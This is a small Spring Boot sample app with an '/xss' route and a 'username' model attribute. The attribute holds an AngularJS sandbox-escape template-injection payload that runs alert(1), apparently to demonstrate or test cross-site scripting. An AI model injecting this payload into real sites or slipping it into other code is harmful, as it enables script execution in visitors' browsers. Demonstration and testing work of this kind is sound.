package sample;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;

@SpringBootApplication
public class Application {

	public static void main(String[] args) {
		SpringApplication.run(Application.class, args);
	}

	@Controller
	static class Home {
		@RequestMapping("/")
		public String home() {
			return "index";
		}
		@RequestMapping("/xss")
		public String xss() {
			return "xss";
		}

		@ModelAttribute("username")
		String value() {
			return "{{\n" +
					"    'a'.constructor.prototype.charAt=[].join;\n" +
					"    $eval('x=alert(1)')+''\n" +
					"}}";
		}
	}
}